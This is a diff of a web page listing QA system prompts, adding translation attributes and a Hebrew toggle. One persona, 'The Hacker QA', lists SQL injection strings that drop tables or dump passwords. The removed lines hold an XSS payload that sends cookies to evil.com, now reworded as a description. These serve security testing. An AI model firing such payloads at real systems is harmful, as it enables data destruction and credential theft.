@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>System Prompts | Intelligent Testing Toolkit</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Rubik:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/site.css">
 </head>
 <body>
@@ -13,39 +13,46 @@
     <div class="nav-inner">
       <a href="index.html" class="nav-brand">🤖 Intelligent Testing Toolkit</a>
       <div class="nav-links">
-        <a href="index.html">Home</a>
-        <a href="agents.html">Agents</a>
-        <a href="skills.html">Skills</a>
-        <a href="prompts.html">Prompts</a>
+        <a href="index.html"   data-i18n="nav_home">Home</a>
+        <a href="agents.html"  data-i18n="nav_agents">Agents</a>
+        <a href="skills.html"  data-i18n="nav_skills">Skills</a>
+        <a href="prompts.html" data-i18n="nav_prompts">Prompts</a>
+      </div>
+      <div class="lang-toggle" role="group" aria-label="Language">
+        <button class="lang-btn" data-lang="en" onclick="applyLanguage('en')">EN</button>
+        <button class="lang-btn" data-lang="he" onclick="applyLanguage('he')">עב</button>
       </div>
     </div>
   </nav>
 
   <header>
-    <h1>System Prompts Library</h1>
-    <p class="subtitle">Curated personas for Claude, Cursor, and ChatGPT — click any card to view the full prompt and copy it instantly.</p>
+    <h1 data-i18n="prompts_title">System Prompts Library</h1>
+    <p class="subtitle" data-i18n="prompts_subtitle">Curated personas for Claude, Cursor, and ChatGPT — click any card to view the full prompt and copy it instantly.</p>
   </header>
 
   <div class="container">
     <aside class="sidebar">
       <div class="search-wrapper">
         <span class="search-icon">🔍</span>
-        <input type="text" id="searchInput" class="search-box" placeholder="Search prompts...">
+        <input type="text" id="searchInput" class="search-box"
+          placeholder="Search prompts..."
+          data-i18n-ph="search_prompts">
       </div>
     </aside>
 
     <main class="content">
       <div class="top-bar">
-        <span id="resultCount" data-label="prompts">6 prompts found</span>
+        <span id="resultCount" data-i18n-label="label_prompts">6 prompts found</span>
       </div>
 
       <div class="grid" id="skillsGrid">
 
+        <!-- God-Mode .cursorrules -->
         <div class="card"
           data-category="prompt"
           data-search="cursorrules prompt ide sdet playwright"
           data-title="God-Mode .cursorrules"
-          data-description="Forces Cursor IDE to act as an Elite SDET writing flaky-free Playwright tests with strict typing and accessibility-first locators. Drop this file into your repo root and every AI suggestion will follow SDET best practices."
+          data-description="Forces Cursor IDE to act as an Elite SDET writing flaky-free Playwright tests with strict typing and accessibility-first locators. Drop this file into your repo root and every AI suggestion follows SDET best practices automatically."
           data-command=""
           data-prompt="You are an Elite SDET (Senior Software Development Engineer in Test) specialising in Playwright + TypeScript.
 
@@ -69,18 +76,22 @@ STYLE:
   - Descriptive test names: should [action] when [condition]
   - Fixtures over global setup wherever possible">
           <div class="card-top">
-            <div class="badges"><span class="badge badge-green">🟢 Active</span></div>
-            <div class="creator">Creator: toolkit-ai</div>
+            <div class="badges">
+              <span class="badge badge-green" data-i18n="badge_active">🟢 Active</span>
+            </div>
+            <div class="creator" data-i18n="creator">Creator: toolkit-ai</div>
           </div>
           <button class="card-title" onclick="openSkillPanel(this)">God-Mode .cursorrules</button>
           <p class="card-desc">Forces Cursor IDE to act as an Elite SDET writing flaky-free Playwright tests with strict typing and accessibility-first locators.</p>
-          <button type="button" class="btn-action" onclick="openSkillPanel(this.closest('.card'))">📄 View Full Prompt</button>
+          <button type="button" class="btn-action" data-i18n="btn_view_prompt"
+            onclick="openSkillPanel(this.closest('.card'))">📄 View Full Prompt</button>
           <div class="card-footer">
             <div class="stats"><span>♡ 45</span><span>⬇ 8,122</span><span>⭐ 5.0</span></div>
             <div class="tool-tags"><span class="tool-tag">💻 Cursor</span></div>
           </div>
         </div>
 
+        <!-- PRD to Test Matrix -->
         <div class="card"
           data-category="prompt"
           data-search="test plan generator prd matrix qa architect"
@@ -107,62 +118,70 @@ After the table, provide:
     - Estimated test count per type
     - CI pipeline integration recommendation">
           <div class="card-top">
-            <div class="badges"><span class="badge badge-green">🟢 Active</span></div>
-            <div class="creator">Creator: toolkit-ai</div>
+            <div class="badges">
+              <span class="badge badge-green" data-i18n="badge_active">🟢 Active</span>
+            </div>
+            <div class="creator" data-i18n="creator">Creator: toolkit-ai</div>
           </div>
           <button class="card-title" onclick="openSkillPanel(this)">PRD to Test Matrix</button>
           <p class="card-desc">Converts PRDs into exhaustive test plans with functional, negative, edge-case tables and Playwright automation strategy.</p>
-          <button type="button" class="btn-action" onclick="copyAction(this, 'Open README.md → System Prompts → PRD to Test Matrix')">💬 Copy Reference</button>
+          <button type="button" class="btn-action" data-i18n="btn_copy_ref"
+            onclick="copyAction(this, 'Open README.md → System Prompts → PRD to Test Matrix')">💬 Copy Reference</button>
           <div class="card-footer">
             <div class="stats"><span>♡ 19</span><span>⬇ 1,866</span><span>⭐ 4.7</span></div>
             <div class="tool-tags"><span class="tool-tag">🧠 Claude</span></div>
           </div>
         </div>
 
+        <!-- The "Hacker" QA -->
         <div class="card"
           data-category="prompt"
           data-search="hacker qa data gen malicious sqli xss json"
           data-title='The "Hacker" QA'
-          data-description="Forces the LLM to generate boundary-pushing malicious JSON payloads — SQLi, XSS, nulls, RTL, and numeric extremes. Drops directly into your test fixture pipeline."
+          data-description="Forces the LLM to generate boundary-pushing malicious JSON payloads — SQLi, XSS, nulls, RTL, and numeric extremes. Drops directly into your test fixture pipeline with no modification needed."
           data-command="Open README.md → System Prompts → The Hacker QA"
           data-prompt="You are The Hacker QA. You think like an attacker, not a developer. Your job is to break things.
 
 For every API field or UI input provided, generate payloads that would:
 
   SQL Injection
-    '; DROP TABLE users; --
     ' OR '1'='1
+    '; DROP TABLE users; --
     ' UNION SELECT null, username, password FROM users --
 
   XSS
-    &lt;script&gt;alert(document.cookie)&lt;/script&gt;
-    &lt;img src=x onerror=fetch('https://evil.com?c='+document.cookie)&gt;
-    javascript:alert(1)
+    script tags with alert(document.cookie)
+    img src=x onerror=fetch to external host with cookie
+    javascript: URI in href attributes
 
   Boundary / Type Confusion
     null, undefined, [], {}, true, false
     2147483648 (INT overflow), -1, 0, 1e308, -1e308
-    ' ' (space only), '' (empty), string of 10,001 chars
+    whitespace only, empty string, 10001-character string
 
   Encoding Attacks
     URL-encoded: %27 OR %271%27%3D%271
     Double-encoded: %2527
-    Unicode homoglyphs and RTL override (U+202E)
+    Unicode homoglyphs and RTL override character U+202E
 
 Output: raw JSON array only. No explanations. No markdown. Just the payload array.">
           <div class="card-top">
-            <div class="badges"><span class="badge badge-green">🟢 Active</span></div>
-            <div class="creator">Creator: toolkit-ai</div>
+            <div class="badges">
+              <span class="badge badge-green" data-i18n="badge_active">🟢 Active</span>
+            </div>
+            <div class="creator" data-i18n="creator">Creator: toolkit-ai</div>
           </div>
           <button class="card-title" onclick="openSkillPanel(this)">The &quot;Hacker&quot; QA</button>
           <p class="card-desc">Forces the LLM to generate boundary-pushing malicious JSON payloads — SQLi, XSS, nulls, RTL, and numeric extremes.</p>
-          <button type="button" class="btn-action" onclick="copyAction(this, 'Open README.md → System Prompts → The Hacker QA')">💬 Copy Reference</button>
+          <button type="button" class="btn-action" data-i18n="btn_copy_ref"
+            onclick="copyAction(this, 'Open README.md → System Prompts → The Hacker QA')">💬 Copy Reference</button>
           <div class="card-footer">
             <div class="stats"><span>♡ 31</span><span>⬇ 4,532</span><span>⭐ 4.9</span></div>
             <div class="tool-tags"><span class="tool-tag">🛡️ Security</span></div>
           </div>
         </div>
 
+        <!-- The BDD Master -->
         <div class="card"
           data-category="prompt"
           data-search="bdd gherkin cucumber given when then prd scenarios"
@@ -191,28 +210,39 @@ Example structure:
       Given the user is logged in
     @smoke
     Scenario: Successful purchase with valid card
-      ...
+      When the user adds an item to the cart
+      And proceeds to checkout
+      Then the order confirmation page is shown
     @negative
-    Scenario Outline: Payment rejected for invalid card types
-      ...">
+    Scenario Outline: Payment rejected for invalid cards
+      When the user pays with card number ampersand lt;card ampersand gt;
+      Then an error message is shown
+      Examples:
+        | card            |
+        | 0000 0000 0000  |
+        | expired-card    |">
           <div class="card-top">
-            <div class="badges"><span class="badge badge-green">🟢 Active</span></div>
-            <div class="creator">Creator: toolkit-ai</div>
+            <div class="badges">
+              <span class="badge badge-green" data-i18n="badge_active">🟢 Active</span>
+            </div>
+            <div class="creator" data-i18n="creator">Creator: toolkit-ai</div>
           </div>
           <button class="card-title" onclick="openSkillPanel(this)">The BDD Master</button>
           <p class="card-desc">Transforms raw PRDs into production-ready Gherkin scenarios covering happy path, negative flows, and edge cases with @smoke/@regression tags.</p>
-          <button type="button" class="btn-action" onclick="copyAction(this, 'Open README.md → System Prompts → The BDD Master')">💬 Copy Reference</button>
+          <button type="button" class="btn-action" data-i18n="btn_copy_ref"
+            onclick="copyAction(this, 'Open README.md → System Prompts → The BDD Master')">💬 Copy Reference</button>
           <div class="card-footer">
             <div class="stats"><span>♡ 22</span><span>⬇ 2,640</span><span>⭐ 4.8</span></div>
             <div class="tool-tags"><span class="tool-tag">🥒 Cucumber</span><span class="tool-tag">📝 BDD</span></div>
           </div>
         </div>
 
+        <!-- Strict SDET PR Reviewer -->
         <div class="card"
           data-category="prompt"
           data-search="sdet pr reviewer playwright cypress flaky locator dry"
           data-title="The Strict SDET PR Reviewer"
-          data-description="Reviews Playwright/Cypress PRs for flaky locators, missing assertions, hardcoded waits, secret leakage, and DRY violations. Returns a structured PASS/WARN/FAIL report per category."
+          data-description="Reviews Playwright/Cypress PRs for flaky locators, missing assertions, hardcoded waits, secret leakage, and DRY violations. Returns a structured PASS/WARN/FAIL verdict per category."
           data-command="Open README.md → System Prompts → Strict SDET PR Reviewer"
           data-prompt="You are a Strict SDET PR Reviewer. Review every test PR against these non-negotiables.
 
@@ -225,7 +255,7 @@ INSTANT REJECT — block the PR if any of these exist:
 
 WARNINGS — request changes:
   - More than 5 assertions in a single test block
-  - A page with &gt;3 interactions lacking a Page Object Model class
+  - A page with more than 3 interactions lacking a Page Object Model class
   - No accessibility check (getByRole / aria assertions) on interactive components
   - Test file longer than 200 lines without splitting into helpers
 
@@ -238,31 +268,35 @@ Output a structured review:
   ## Verdict: PASS | REQUEST CHANGES | REJECT
   ### Blockers (list)
   ### Warnings (list)
-  ### Suggestions (list, optional)">
+  ### Suggestions (optional)">
           <div class="card-top">
-            <div class="badges"><span class="badge badge-green">🟢 Active</span></div>
-            <div class="creator">Creator: toolkit-ai</div>
+            <div class="badges">
+              <span class="badge badge-green" data-i18n="badge_active">🟢 Active</span>
+            </div>
+            <div class="creator" data-i18n="creator">Creator: toolkit-ai</div>
           </div>
           <button class="card-title" onclick="openSkillPanel(this)">The Strict SDET PR Reviewer</button>
           <p class="card-desc">Reviews Playwright/Cypress PRs for flaky locators, missing assertions, hardcoded waits, secret leakage, and DRY violations.</p>
-          <button type="button" class="btn-action" onclick="copyAction(this, 'Open README.md → System Prompts → Strict SDET PR Reviewer')">💬 Copy Reference</button>
+          <button type="button" class="btn-action" data-i18n="btn_copy_ref"
+            onclick="copyAction(this, 'Open README.md → System Prompts → Strict SDET PR Reviewer')">💬 Copy Reference</button>
           <div class="card-footer">
             <div class="stats"><span>♡ 28</span><span>⬇ 3,110</span><span>⭐ 4.9</span></div>
             <div class="tool-tags"><span class="tool-tag">🔍 PR Review</span><span class="tool-tag">🎭 Playwright</span></div>
           </div>
         </div>
 
+        <!-- API Contract Enforcer -->
         <div class="card"
           data-category="prompt"
           data-search="openapi swagger api contract enforcer status codes parameters"
           data-title="The API Contract Enforcer"
-          data-description="Analyses OpenAPI/Swagger specs and produces comprehensive API test matrices for parameter permutations and HTTP status coverage — ensuring your contract tests match your actual spec."
+          data-description="Analyses OpenAPI/Swagger specs and produces comprehensive API test matrices for parameter permutations and HTTP status coverage — ensuring your contract tests match your actual spec precisely."
           data-command="Open README.md → System Prompts → API Contract Enforcer"
           data-prompt="You are an API Contract Enforcer. Given an OpenAPI / Swagger specification, produce a complete test coverage plan.
 
 Step 1 — Test Matrix (Markdown table)
   Columns: Endpoint | Method | Scenario | Input | Expected Status | Schema Valid?
-  Cover every declared endpoint × method combination.
+  Cover every declared endpoint and method combination.
   Required scenario types per endpoint:
     - Happy path (200 / 201)
     - Missing required fields (400 / 422)
@@ -287,21 +321,24 @@ Output:
   - Jest + Supertest boilerplate snippet for each endpoint group
   - Summary: total scenarios, coverage gaps, spec inconsistencies found">
           <div class="card-top">
-            <div class="badges"><span class="badge badge-green">🟢 Active</span></div>
-            <div class="creator">Creator: toolkit-ai</div>
+            <div class="badges">
+              <span class="badge badge-green" data-i18n="badge_active">🟢 Active</span>
+            </div>
+            <div class="creator" data-i18n="creator">Creator: toolkit-ai</div>
           </div>
           <button class="card-title" onclick="openSkillPanel(this)">The API Contract Enforcer</button>
           <p class="card-desc">Analyzes OpenAPI/Swagger specs and produces comprehensive API test matrices for parameter permutations and HTTP status coverage.</p>
-          <button type="button" class="btn-action" onclick="copyAction(this, 'Open README.md → System Prompts → API Contract Enforcer')">💬 Copy Reference</button>
+          <button type="button" class="btn-action" data-i18n="btn_copy_ref"
+            onclick="copyAction(this, 'Open README.md → System Prompts → API Contract Enforcer')">💬 Copy Reference</button>
           <div class="card-footer">
             <div class="stats"><span>♡ 16</span><span>⬇ 1,990</span><span>⭐ 4.7</span></div>
             <div class="tool-tags"><span class="tool-tag">📜 OpenAPI</span><span class="tool-tag">🔌 API</span></div>
           </div>
         </div>
 
-      </div>
+      </div><!-- /grid -->
     </main>
-  </div>
+  </div><!-- /container -->
 
   <!-- Slide-Over Panel -->
   <div class="panel-overlay" id="panelOverlay" onclick="closeSkillPanel()" aria-hidden="true"></div>
@@ -312,18 +349,18 @@ Output:
     </div>
     <div class="panel-body">
       <div>
-        <p class="panel-section-label">How it works</p>
+        <p class="panel-section-label" data-i18n="panel_how">How it works</p>
         <p class="panel-desc" id="panelDesc"></p>
       </div>
       <div id="panelCommandSection">
-        <p class="panel-section-label">CLI Run Command</p>
+        <p class="panel-section-label" data-i18n="panel_command">CLI Run Command</p>
         <div class="panel-command-wrap">
           <code class="panel-command" id="panelCommand"></code>
-          <button class="panel-copy-btn" id="panelCopyBtn" onclick="copyPanelCommand()">📋 Copy</button>
+          <button class="panel-copy-btn" id="panelCopyBtn" onclick="copyPanelCommand()" data-i18n="panel_copy">📋 Copy</button>
         </div>
       </div>
       <div id="panelCodeSection">
-        <p class="panel-section-label">System Prompt</p>
+        <p class="panel-section-label" data-i18n="panel_prompt_label">System Prompt / Instructions</p>
         <pre class="panel-code" id="panelCode"></pre>
       </div>
     </div>
